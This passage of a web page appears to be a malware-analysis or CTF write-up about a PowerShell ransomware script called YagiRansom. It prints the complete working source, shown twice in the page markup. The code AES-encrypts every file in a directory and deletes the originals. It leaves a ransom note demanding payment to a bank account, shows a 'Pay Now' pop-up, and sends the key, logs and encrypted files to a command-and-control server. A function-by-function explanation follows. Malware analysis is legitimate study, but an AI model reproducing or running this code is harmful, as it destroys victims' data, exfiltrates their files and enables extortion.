}}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">function CheckFiles { \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $RFiles\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = Get-ChildItem \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$Directory\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> -recurse -filter *.enc ; if (\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$RFiles\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">) { \u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$RFiles\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> } else {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   Write-Host \"[!] No encrypted files found!\" -ForegroundColor Red }}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"># Main\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">if (\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$Mode\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> -eq \"-d\") { \u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   Write-Host ; Write-Host \"[!] Shutdowning....\" -ForegroundColor Red; sleep 1 }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">else {\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   Write-Host ;\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   Write-Host \"[+] Checking communication with C2 Server..\" -ForegroundColor Blue\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $DCe\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = GetStatus ; sleep 1\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">   $WiETm\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$_\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">})\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   Write-Host \"[!] Encrypting ...\" -ForegroundColor Red\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   CreateReadme ; EncryptFiles ; if (\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$DCe\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">) { SendResults ; sleep 1\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   if (\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$ENyR\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> -eq \"-x\") { Write-Host \"[i] Exfiltrating ...\" -ForegroundColor Green\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">      ExfiltrateFiles ; sleep 1 }}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   if (!\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$DCe\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">) { Write-Host \"[+] Saving logs in yaginote.txt..\" -ForegroundColor Blue }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   else { Write-Host \"[+] Sending logs to C2 Server..\" -ForegroundColor Blue }}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   if (\u003C/span>\u003Cspan style=\"--shiki-light:#023B95;--shiki-dark:#91CBFF\">$args\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> -like \"-demo\") { RemoveWallpaper ; PopUpRansom\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   if (\u003C/span>\u003Cspan style=\"--shiki-light:#0E1116;--shiki-dark:#F0F3F6\">$PayNow\u003C/span>\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\"> -eq \"True\") { SendPay ; SendOK } else { SendClose ; SendOK }}\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">   else { SendOK }\u003C/span>\u003C/span>\n\u003Cspan data-line=\"\">\u003Cspan style=\"--shiki-light:#032563;--shiki-dark:#ADDCFF\">sleep 1000 ; Write-Host \"[i] Done!\" -ForegroundColor Green ; Write-Host\u003C/span>\u003C/span>\u003Cbutton type=\"button\" title=\"Copy code\" aria-label=\"Copy code\" data=\"# Design\n$ProgressPreference = &#x22;SilentlyContinue&#x22;\n$ErrorActionPreference = &#x22;SilentlyContinue&#x22;\n$OSVersion = [Environment]::OSVersion.Platform\nif ($OSVersion -like &#x22;*Win*&#x22;) {\n$Host.UI.RawUI.WindowTitle = &#x22;YagiRansom&#x22; \n$Host.UI.RawUI.BackgroundColor = &#x22;Black&#x22;\n$Host.UI.RawUI.ForegroundColor = &#x22;White&#x22; }\n# Variables\n$Mode = $args[0]\n$Directory = $args[1]\n$WiETm = $args[3]\n$7CiB = $args[3]\n$UFX = $args[5]\n$ENyR = $args[6]\n$DCe = $null\n# Errors\nif ($args[0] -like &#x22;-h*&#x22;) { break }\nif ($args[0] -eq $null) { Write-Host &#x22;[!] Not enough/Wrong parameters!&#x22; -ForegroundColor Red ; Write-Host ; break }\nif ($args[1] -eq $null) { Write-Host &#x22;[!] Not enough/Wrong parameters!&#x22; -ForegroundColor Red ; Write-Host ; break }\nif ($args[2] -eq $null) { Write-Host &#x22;[!] Not enough/Wrong parameters!&#x22; -ForegroundColor Red ; Write-Host ; break }\nif ($args[3] -eq $null) { Write-Host &#x22;[!] Not enough/Wrong parameters!&#x22; -ForegroundColor Red ; Write-Host ; break }\n# Proxy Aware\n[System.Net.WebRequest]::DefaultWebProxy = [System.Net.WebRequest]::GetSystemWebProxy()\n[System.Net.WebRequest]::DefaultWebProxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials\n$AllProtocols = [System.Net.SecurityProtocolType]&#x22;Ssl3,Tls,Tls11,Tls12&#x22; ; [System.Net.ServicePointManager]::SecurityProtocol = $AllProtocols\n# Functions\n$OgE = ([Environment]::MachineName).ToLower() ; $zVSza = ([Environment]::UserName).ToLower() ; $I26 = &#x22;yaginote.txt&#x22;\n$7VEq = Get-Date -Format &#x22;HH:mm - dd/MM/yy&#x22; ; $Uz19o = $7VEq.replace(&#x22;:&#x22;,&#x22;&#x22;).replace(&#x22; &#x22;,&#x22;&#x22;).replace(&#x22;-&#x22;,&#x22;&#x22;).replace(&#x22;/&#x22;,&#x22;&#x22;)+$zVSza+$OgE\nif ($OSVersion -like &#x22;*Win*&#x22;) { $domain = (([Environment]::UserDomainName).ToLower()+&#x22;\\&#x22;) ; $slash = &#x22;\\&#x22; } else { $domain = $null ; $slash = &#x22;/&#x22; } \n$DirectoryTarget = $Directory.Split($slash)[-1] ; if (!$DirectoryTarget) { $DirectoryTarget = $Directory.Path.Split($slash)[-1] }\nfunction Invoke-AESEncryption {\n   [CmdletBinding()]\n   [OutputType([string])]\n   Param(\n       [Parameter(Mandatory = $true)]\n       [String]$Key,\n       [Parameter(Mandatory = $true, ParameterSetName = &#x22;CryptText&#x22;)]\n       [String]$Text,\n       [Parameter(Mandatory = $true, ParameterSetName = &#x22;CryptFile&#x22;)]\n       [String]$Path)\n   Begin {\n      $m95I = New-Object System.Security.Cryptography.SHA256Managed\n      $n9ibn = New-Object System.Security.Cryptography.AesManaged\n      $n9ibn.Mode = [System.Security.Cryptography.CipherMode]::CBC\n      $n9ibn.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7\n      $n9ibn.BlockSize = 128\n      $n9ibn.KeySize = 256 }\n   Process {\n      $n9ibn.Key = $m95I.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))\n      if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}\n      if ($Path) {\n         $File = Get-Item -Path $Path -ErrorAction SilentlyContinue\n         if (!$File.FullName) { break }\n         $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)\n         $outPath = $File.FullName + &#x22;.enc&#x22; }\n      $encryptor = $n9ibn.CreateEncryptor()\n      $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)\n      $encryptedBytes = $n9ibn.IV + $encryptedBytes\n      $n9ibn.Dispose()\n      if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}\n      if ($Path) {\n         [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)\n         (Get-Item $outPath).LastWriteTime = $File.LastWriteTime }}\n  End {\n      $m95I.Dispose()\n      $n9ibn.Dispose()}}\nfunction RemoveWallpaper {\n$code = @&#x22;\nusing System;\nusing System.Drawing;\nusing System.Runtime.InteropServices;\nusing Microsoft.Win32;\nnamespace CurrentUser { public class Desktop {\n[DllImport(&#x22;user32.dll&#x22;, SetLastError = true, CharSet = CharSet.Auto)]\nprivate static extern int SystemParametersInfo(int uAction, int uParm, string lpvParam, int fuWinIni);\n[DllImport(&#x22;user32.dll&#x22;, CharSet = CharSet.Auto, SetLastError = true)]\nprivate static extern int SetSysColors(int cElements, int[] lpaElements, int[] lpRgbValues);\npublic const int UpdateIniFile = 0x01; public const int SendWinIniChange = 0x02;\npublic const int SetDesktopBackground = 0x0014; public const int COLOR_DESKTOP = 1;\npublic int[] first = {COLOR_DESKTOP};\npublic static void RemoveWallPaper(){\nSystemParametersInfo( SetDesktopBackground, 0, &#x22;&#x22;, SendWinIniChange | UpdateIniFile );\nRegistryKey regkey = Registry.CurrentUser.OpenSubKey(&#x22;Control Panel\\\\Desktop&#x22;, true);\nregkey.SetValue(@&#x22;WallPaper&#x22;, 0); regkey.Close();}\npublic static void SetBackground(byte r, byte g, byte b){ int[] elements = {COLOR_DESKTOP};\nRemoveWallPaper();\nSystem.Drawing.Color color = System.Drawing.Color.FromArgb(r,g,b);\nint[] colors = { System.Drawing.ColorTranslator.ToWin32(color) };\nSetSysColors(elements.Length, elements, colors);\nRegistryKey key = Registry.CurrentUser.OpenSubKey(&#x22;Control Panel\\\\Colors&#x22;, true);\nkey.SetValue(@&#x22;Background&#x22;, string.Format(&#x22;{0} {1} {2}&#x22;, color.R, color.G, color.B));\nkey.Close();}}}\ntry { Add-Type -TypeDefinition $code -ReferencedAssemblies System.Drawing.dll }\nfinally {[CurrentUser.Desktop]::SetBackground(250, 25, 50)}}\nfunction PopUpRansom {\n[void] [System.Reflection.Assembly]::LoadWithPartialName(&#x22;System.Drawing&#x22;)  \n[void] [System.Reflection.Assembly]::LoadWithPartialName(&#x22;System.Windows.Forms&#x22;) \n[void] [System.Windows.Forms.Application]::EnableVisualStyles() \nInvoke-WebRequest -useb https://www.mediafire.com/view/wlq9mlfrlonlcuk/yagi.png/file -Outfile $env:temp\\YagiRansom.jpg\nInvoke-WebRequest -useb https://www.mediafire.com/file/s4qcg4hk6bnd2pe/Yagi.ico/file -Outfile $env:temp\\YagiRansom.ico\n$shell = New-Object -ComObject &#x22;Shell.Application&#x22;\n$shell.minimizeall()\n$form = New-Object system.Windows.Forms.Form\n$form.ControlBox = $false;\n$form.Size = New-Object System.Drawing.Size(900,600) \n$form.BackColor = &#x22;Black&#x22; \n$form.MaximizeBox = $false \n$form.StartPosition = &#x22;CenterScreen&#x22; \n$form.WindowState = &#x22;Normal&#x22;\n$form.Topmost = $true\n$form.FormBorderStyle = &#x22;Fixed3D&#x22;\n$form.Text = &#x22;YagiRansom&#x22;\n$formIcon = New-Object system.drawing.icon (&#x22;$env:temp\\YagiRansom.ico&#x22;) \n$form.Icon = $formicon  \n$img = [System.Drawing.Image]::Fromfile(&#x22;$env:temp\\YagiRansom.jpg&#x22;)\n$pictureBox = new-object Windows.Forms.PictureBox\n$pictureBox.Width = 920\n$pictureBox.Height = 370\n$pictureBox.SizeMode = &#x22;StretchImage&#x22;\n$pictureBox.Image = $img\n$form.controls.add($pictureBox)\n$label = New-Object System.Windows.Forms.Label\n$label.ForeColor = &#x22;Cyan&#x22;\n$label.Text = &#x22;All your files have been encrypted by YagiRansom!&#x22; \n$label.AutoSize = $true \n$label.Location = New-Object System.Drawing.Size(50,400) \n$font = New-Object System.Drawing.Font(&#x22;Consolas&#x22;,15,[System.Drawing.FontStyle]::Bold) \n$form.Font = $Font \n$form.Controls.Add($label) \n$label1 = New-Object System.Windows.Forms.Label\n$label1.ForeColor = &#x22;White&#x22;\n$label1.Text = &#x22;But don\nt worry, you can still recover them with the recovery key if you pay the ransom in the next 8 hours.&#x22; \n$label1.AutoSize = $true \n$label1.Location = New-Object System.Drawing.Size(50,450)\n$font1 = New-Object System.Drawing.Font(&#x22;Consolas&#x22;,15,[System.Drawing.FontStyle]::Bold) \n$form.Font = $Font1\n$form.Controls.Add($label1) \n$okbutton = New-Object System.Windows.Forms.Button;\n$okButton.Location = New-Object System.Drawing.Point(750,500)\n$okButton.Size = New-Object System.Drawing.Size(110,35)\n$okbutton.ForeColor = &#x22;Black&#x22;\n$okbutton.BackColor = &#x22;White&#x22;\n$okbutton.FlatStyle = [System.Windows.Forms.FlatStyle]::Flat\n$okButton.Text = &#x27;Pay Now!&#x27;\n$okbutton.Visible = $false\n$okbutton.Enabled = $true\n$okButton.DialogResult = [System.Windows.Forms.DialogResult]::OK\n$okButton.add_Click({ \n[System.Windows.Forms.MessageBox]::Show($this.ActiveForm, &#x27;Your payment order has been successfully registered!&#x27;, &#x27;YagiRansom Payment Processing System&#x27;,\n[Windows.Forms.MessageBoxButtons]::&#x22;OK&#x22;, [Windows.Forms.MessageBoxIcon]::&#x22;Warning&#x22;)})\n$form.AcceptButton = $okButton\n$form.Controls.Add($okButton)\n$form.Activate() 2>&#x26;1> $null\n$form.Focus() 2>&#x26;1> $null\n$btn=New-Object System.Windows.Forms.Label\n$btn.Location = New-Object System.Drawing.Point(50,500)\n$btn.Width = 500\n$form.Controls.Add($btn)\n$btn.ForeColor = &#x22;Red&#x22;\n$startTime = [DateTime]::Now\n$count = 10.6\n$7VEqr=New-Object System.Windows.Forms.Timer\n$7VEqr.add_Tick({$elapsedSeconds = ([DateTime]::Now - $startTime).TotalSeconds ; $remainingSeconds = $count - $elapsedSeconds\nif ($remainingSeconds -like &#x22;-0.1*&#x22;){ $7VEqr.Stop() ; $okbutton.Visible = $true ; $btn.Text = &#x22;0 Seconds remaining..&#x22; }\n$btn.Text = [String]::Format(&#x22;{0} Seconds remaining..&#x22;, [math]::round($remainingSeconds))})\n$7VEqr.Start()\n$btntest = $form.ShowDialog()\nif ($btntest -like &#x22;OK&#x22;){ $Global:PayNow = &#x22;True&#x22; }}\nfunction R64Encoder { \n   if ($args[0] -eq &#x22;-t&#x22;) { $VaFQ = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($args[1])) }\n   if ($args[0] -eq &#x22;-f&#x22;) { $VaFQ = [Convert]::ToBase64String([IO.File]::ReadAllBytes($args[1])) }\n   $VaFQ = $VaFQ.Split(&#x22;=&#x22;)[0] ; $VaFQ = $VaFQ.Replace(&#x22;C&#x22;, &#x22;-&#x22;) ; $VaFQ = $VaFQ.Replace(&#x22;E&#x22;, &#x22;_&#x22;)\n   $8bKW = $VaFQ.ToCharArray() ; [array]::Reverse($8bKW) ; $R64Base = -join $8bKW ; return $R64Base }\nfunction GetStatus {\n   Try { Invoke-WebRequest -useb &#x22;$7CiB&#x60;:$UFX/status&#x22; -Method GET \n      Write-Host &#x22;[i] C2 Server is up!&#x22; -ForegroundColor Green }\n   Catch { Write-Host &#x22;[!] C2 Server is down!&#x22; -ForegroundColor Red }}\nfunction SendResults {\n   $cvf = Invoke-AESEncryption -Key $Uz19o -Text $WiETm ; $cVl = R64Encoder -t $cvf\n   $2YngY = &#x22;> $cVl > $OgE > $zVSza > $7VEq&#x22;\n   $RansomLogs = Get-Content &#x22;$Directory$slash$I26&#x22; | Select-String &#x22;[!]&#x22; | Select-String &#x22;YagiRansom!&#x22; -NotMatch\n   $XoX = R64Encoder -t $2YngY ; $B64Logs = R64Encoder -t $RansomLogs\n   Invoke-WebRequest -useb &#x22;$7CiB&#x60;:$UFX/data&#x22; -Method POST -Body $XoX 2>&#x26;1> $null\n   Invoke-WebRequest -useb &#x22;$7CiB&#x60;:$UFX/logs&#x22; -Method POST -Body $B64Logs 2>&#x26;1> $null }\nfunction SendClose {\n   Invoke-WebRequest -useb &#x22;$7CiB&#x60;:$UFX/close&#x22; -Method GET 2>&#x26;1> $null }\nfunction SendPay {\n   Invoke-WebRequest -useb &#x22;$7CiB&#x60;:$UFX/pay&#x22; -Method GET 2>&#x26;1> $null }\nfunction SendOK {\n   Invoke-WebRequest -useb &#x22;$7CiB&#x60;:$UFX/done&#x22; -Method GET 2>&#x26;1> $null }\nfunction CreateReadme {\n   $I26TXT = &#x22;All your files have been encrypted by YagiRansom!!&#x60;nBut don&#x27;t worry, you can still recover them with the recovery key if you pay the ransom in the next 8 hours.&#x60;nTo get decryption instructions, you must transfer 100000$ to the following account:&#x60;n&#x60;nAccount Name: Mat tran To quoc Viet Nam - Ban Cuu Tro Trung uong&#x60;n&#x60;nAccount Number: 0011.00.1932418&#x60;n&#x60;nBank: Vietnam Joint Stock Commercial Bank for Foreign Trade (Vietcombank)&#x60;n&#x22;\n   if (!(Test-Path &#x22;$Directory$slash$I26&#x22;)) { Add-Content -Path &#x22;$Directory$slash$I26&#x22; -Value $I26TXT }}\nfunction EncryptFiles { \n   $ExcludedFiles = &#x27;*.enc&#x27;, &#x27;yaginote.txt&#x27;, &#x27;*.dll&#x27;, &#x27;*.ini&#x27;, &#x27;*.sys&#x27;, &#x27;*.exe&#x27;, &#x27;*.msi&#x27;, &#x27;*.NLS&#x27;, &#x27;*.acm&#x27;, &#x27;*.nls&#x27;, &#x27;*.EXE&#x27;, &#x27;*.dat&#x27;, &#x27;*.efi&#x27;, &#x27;*.mui&#x27;\n   foreach ($i in $(Get-ChildItem $Directory -recurse -exclude $ExcludedFiles | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) { \n   Invoke-AESEncryption -Key $WiETm -Path $i ; Add-Content -Path &#x22;$Directory$slash$I26&#x22; -Value &#x22;[!] $i is now encrypted&#x22; ;\n   Remove-Item $i }\n   $RansomLogs = Get-Content &#x22;$Directory$slash$I26&#x22; | Select-String &#x22;[!]&#x22; | Select-String &#x22;YagiRansom!&#x22; -NotMatch ; if (!$RansomLogs) { \n   Add-Content -Path &#x22;$Directory$slash$I26&#x22; -Value &#x22;[!] No files have been encrypted!&#x22; }}\nfunction ExfiltrateFiles {\n   Invoke-WebRequest -useb &#x22;$7CiB&#x60;:$UFX/files&#x22; -Method GET 2>&#x26;1> $null \n   $RansomLogs = Get-Content &#x22;$Directory$slash$I26&#x22; | Select-String &#x22;No files have been encrypted!&#x22; ; if (!$RansomLogs) {\n   foreach ($i in $(Get-ChildItem $Directory -recurse -filter *.enc | Where-Object { ! $_.PSIsContainer } | ForEach-Object { $_.FullName })) {\n      $Pfile = $i.split($slash)[-1] ; $B64file = R64Encoder -f $i ; $B64Name = R64Encoder -t $Pfile\n      Invoke-WebRequest -useb &#x22;$7CiB&#x60;:$UFX/files/$B64Name&#x22; -Method POST -Body $B64file 2>&#x26;1> $null }}\n   else { $B64Name = R64Encoder -t &#x22;none.null&#x22; ; Invoke-WebRequest -useb &#x22;$7CiB&#x60;:$UFX/files/$B64Name&#x22; -Method POST -Body $B64file 2>&#x26;1> $null }}\nfunction CheckFiles { \n   $RFiles = Get-ChildItem $Directory -recurse -filter *.enc ; if ($RFiles) { $RFiles } else {\n   Write-Host &#x22;[!] No encrypted files found!&#x22; -ForegroundColor Red }}\n# Main\nif ($Mode -eq &#x22;-d&#x22;) { \n   Write-Host ; Write-Host &#x22;[!] Shutdowning....&#x22; -ForegroundColor Red; sleep 1 }\nelse {\n   Write-Host ;\n   Write-Host &#x22;[+] Checking communication with C2 Server..&#x22; -ForegroundColor Blue\n   $DCe = GetStatus ; sleep 1\n   $WiETm = -join ( (48..57) + (65..90) + (97..122) | Get-Random -Count 24 | % {[char]$_})\n   Write-Host &#x22;[!] Encrypting ...&#x22; -ForegroundColor Red\n   CreateReadme ; EncryptFiles ; if ($DCe) { SendResults ; sleep 1\n   if ($ENyR -eq &#x22;-x&#x22;) { Write-Host &#x22;[i] Exfiltrating ...&#x22; -ForegroundColor Green\n      ExfiltrateFiles ; sleep 1 }}\n   if (!$DCe) { Write-Host &#x22;[+] Saving logs in yaginote.txt..&#x22; -ForegroundColor Blue }\n   else { Write-Host &#x22;[+] Sending logs to C2 Server..&#x22; -ForegroundColor Blue }}\n   if ($args -like &#x22;-demo&#x22;) { RemoveWallpaper ; PopUpRansom\n   if ($PayNow -eq &#x22;True&#x22;) { SendPay ; SendOK } else { SendClose ; SendOK }}\n   else { SendOK }\nsleep 1000 ; Write-Host &#x22;[i] Done!&#x22; -ForegroundColor Green ; Write-Host\" class=\"rehype-pretty-copy\" onclick=\"navigator.clipboard.writeText(this.attributes.data.value);this.classList.add(&#x27;rehype-pretty-copied&#x27;);window.setTimeout(() => this.classList.remove(&#x27;rehype-pretty-copied&#x27;), 1000);\">\u003Cspan class=\"ready\">\u003C/span>\u003Cspan class=\"success\">\u003C/span>\u003C/button>\u003Cstyle>:root {--copy-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23adadad' d='M16.187 9.5H12.25a1.75 1.75 0 0 0-1.75 1.75v28.5c0 .967.784 1.75 1.75 1.75h23.5a1.75 1.75 0 0 0 1.75-1.75v-28.5a1.75 1.75 0 0 0-1.75-1.75h-3.937a4.25 4.25 0 0 1-4.063 3h-7.5a4.25 4.25 0 0 1-4.063-3M31.813 7h3.937A4.25 4.25 0 0 1 40 11.25v28.5A4.25 4.25 0 0 1 35.75 44h-23.5A4.25 4.25 0 0 1 8 39.75v-28.5A4.25 4.25 0 0 1 12.25 7h3.937a4.25 4.25 0 0 1 4.063-3h7.5a4.25 4.25 0 0 1 4.063 3M18.5 8.25c0 .966.784 1.75 1.75 1.75h7.5a1.75 1.75 0 1 0 0-3.5h-7.5a1.75 1.75 0 0 0-1.75 1.75'/%3E%3C/svg%3E\");--success-icon: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%2366ff85' d='M9 16.17L5.53 12.7a.996.996 0 1 0-1.41 1.41l4.18 4.18c.39.39 1.02.39 1.41 0L20.29 7.71a.996.996 0 1 0-1.41-1.41z'/%3E%3C/svg%3E\");}pre:has(code) {position: relative;}pre button.rehype-pretty-copy {right: 1px;padding: 0;width: 24px;height: 24px;display: flex;margin-top: 2px;margin-right: 8px;position: absolute;border-radius: 25%;backdrop-filter: blur(3px);& span {width: 100%;aspect-ratio: 1 / 1;}& .ready {background-image: var(--copy-icon);}& .success {display: none; background-image: var(--success-icon);}}&.rehype-pretty-copied {& .success {display: block;} & .ready {display: none;}}pre button.rehype-pretty-copy.rehype-pretty-copied {opacity: 1;& .ready { display: none; }& .success { display: block; }}pre button.rehype-pretty-copy { opacity: 0; }figure[data-rehype-pretty-code-figure]:hover > pre > code button.rehype-pretty-copy {opacity: 1;}\u003C/style>\u003C/code>\u003C/pre>\u003C/figure>\n\u003C/section>\u003C/section>\u003Csection class=\"heading\" data-heading-rank=\"3\" aria-labelledby=\"powershell-code-block-analysis\">\u003Ch3 id=\"powershell-code-block-analysis\">PowerShell code block analysis\u003C/h3>\n\u003Cul>\n\u003Cli>Section:\n\u003Cul>\n\u003Cli>\u003Ccode>#Design\u003C/code>: Suppresses the PowerShell errors and messages to avoid detection, detects if the system is Windows or not. If the system is Windows, changes the terminal to \u003Ccode>YagiRansom\u003C/code> and changes the background to black and foreground to white.\u003C/li>\n\u003Cli>\u003Ccode>#Error\u003C/code>: Checks if all the required parameters are provided; if not, prints an error and exits.\u003C/li>\n\u003Cli>\u003Ccode>#Proxy Aware\u003C/code>: Ensures the script uses the system proxy settings as well as compatibility with multiple TLS (Transport Layer Security) protocols.\u003C/li>\n\u003Cli>\u003Ccode>#Functions\u003C/code>: There are many functions in this section.\n\u003Cul>\n\u003Cli>\u003Ccode>$OgE\u003C/code>: Stores the machine name.\u003C/li>\n\u003Cli>\u003Ccode>$zVSza\u003C/code>: Stores the username.\u003C/li>\n\u003Cli>\u003Ccode>$I26\u003C/code>: Stores the ransom note file name.\u003C/li>\n\u003Cli>\u003Ccode>Invoke-AESEncryption\u003C/code>: Encrypts files using AES-256 encryption. Encrypts either text (-Text) or files (-Path) and output encrypted data as a Base64 string or a new .enc file.\u003C/li>\n\u003Cli>\u003Ccode>RemoveWallpaper\u003C/code>: Removes the desktop wallpaper and set a solid red background.\u003C/li>\n\u003Cli>\u003Ccode>PopUpRansom\u003C/code>: Displays a ransom pop-up window and a countdown timer before enabling the \u003Ccode>Pay Now!\u003C/code> button.\u003C/li>\n\u003Cli>\u003Ccode>R64Encoder\u003C/code>: Encodes text or file contents into a Base64 format.\u003C/li>\n\u003Cli>\u003Ccode>C2 Communication\u003C/code>:\n\u003Cul>\n\u003Cli>\u003Ccode>GetStatus\u003C/code>: Checks if the C2 server is online.\u003C/li>\n\u003Cli>\u003Ccode>SendResults\u003C/code>: Send encryption results to the C2 server.\u003C/li>\n\u003Cli>\u003Ccode>SendClose\u003C/code>: Tell the C2 server that the process was completed.\u003C/li>\n\u003Cli>\u003Ccode>SendPay\u003C/code>: Tell the C2 server that the ransom was paid.\u003C/li>\n\u003Cli>\u003Ccode>SendOK\u003C/code>: Final confirmation to the C2 server.\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003Cli>\u003Ccode>CreateReadme\u003C/code>: Creates \u003Ccode>yaginote.txt\u003C/code> with: Ransom message and Bank Account.\u003C/li>\n\u003Cli>\u003Ccode>EncryptFiles\u003C/code>: Encrypts all files in a directory and deletes the original.\u003C/li>\n\u003Cli>\u003Ccode>ExfiltrateFiles\u003C/code>: Uploads encrypted file to the C2 server.\u003C/li>\n\u003Cli>\u003Ccode>CheckFiles\u003C/code>: Check if any \u003Ccode>.enc\u003C/code> files exist in \u003Ccode>$Directory\u003C/code>\u003C/li>\n\u003Cli>\u003Ccode>Main\u003C/code>: Execute the main flow.\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003C/ul>\n\u003C/li>\n\u003C/ul>\n\u003Cblockquote>\n\u003Cp>From the code we could see the program flow will be:\u003C/p>\n\u003Col>\n\u003Cli>Check the OS, the \u003Ccode>args\u003C/code> and setup proxy for the C2\u003C/li>\n\u003Cli>Generate AES key then encrypt the files and log them.\u003C/li>\n\u003Cli>Send the results, logs to the C2 and exfiltrate \u003Ccode>.enc\u003C/code> files.\u003C/li>\n\u003Cli>Create a ransom \u003Ccode>readme\u003C/code> note and display a GUI popup with \u003Ccode>Pay Now!\u003C/code> button\u003C/li>\n\u003Cli>Notify the C2 either \u003Ccode>OK\u003C/code>, \u003Ccode>Close\u003C/code> or \u003Ccode>Pay Flags\u003C/code>\r\n{: .prompt-tip}\u003C/li>\n\u003C/ol>\n\u003C/blockquote>\n\u003Cp>Let’s analyze each function more carefully\u003C/p>\n\u003Csection class=\"heading\" data-heading-rank=\"4\" aria-labelledby=\"aesencryption\">\u003Ch4 id=\"aesencryption\">AESEncryption\u003C/h4>\n\u003Cfigure data-rehype-pretty-code-figure=\"\">\u003Cpre style=\"--shiki-light:#0e1116;--shiki-dark:#f0f3f6;--shiki-light-bg:#ffffff;--shiki-dark-bg:#0a0c10\" tabindex=\"0\" data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\">\u003Ccode data-language=\"powershell\" data-theme=\"github-light-high-contrast github-dark-high-contrast\" style=\"display: grid;\">\u003Cspan data-line=\"\">\u003Cspan 